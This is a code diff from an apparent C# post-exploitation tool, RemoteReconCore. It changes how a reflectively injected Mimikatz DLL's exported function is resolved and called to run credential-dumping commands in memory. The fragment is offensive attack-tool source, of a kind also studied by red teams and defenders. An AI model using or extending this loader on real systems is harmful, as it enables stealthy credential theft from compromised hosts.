@@ -24,18 +24,15 @@ namespace RemoteReconCore
             // for powershell_reflective_mimikatz with our command and obtain the result.
 
             Injector m = new Injector(mmBin);
+            m.mimikatz = true;
             if (!m.Load())
                 return new KeyValuePair<int, string>(9, Convert.ToBase64String(Encoding.ASCII.GetBytes("Mimikatz load failed")));
 
-            IntPtr hMimikatz = GetModuleHandle("mimikatz-RR.dll");
+            IntPtr hMimikatz = m.mimikatzPtr;
             if (hMimikatz == null || hMimikatz == IntPtr.Zero)
                 return new KeyValuePair<int, string>(9, Convert.ToBase64String(Encoding.ASCII.GetBytes("Unable to obtain handle to mimikatz module")));
 
-            IntPtr exportAddr = GetProcAddress(hMimikatz, "powershell_reflective_mimikatz");
-            if(exportAddr == null || exportAddr == IntPtr.Zero)
-                return new KeyValuePair<int, string>(9, Convert.ToBase64String(Encoding.ASCII.GetBytes("Unable to obtain handle to mimikatz module")));
-
-            powershell_reflective_mimikatz mimikatz = (powershell_reflective_mimikatz)Marshal.GetDelegateForFunctionPointer(exportAddr, typeof(powershell_reflective_mimikatz));
+            powershell_reflective_mimikatz mimikatz = (powershell_reflective_mimikatz)Marshal.GetDelegateForFunctionPointer(hMimikatz, typeof(powershell_reflective_mimikatz));
 
             try
             {
@@ -53,11 +50,5 @@ namespace RemoteReconCore
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         private delegate string powershell_reflective_mimikatz(string command);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
-        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
     }
 }
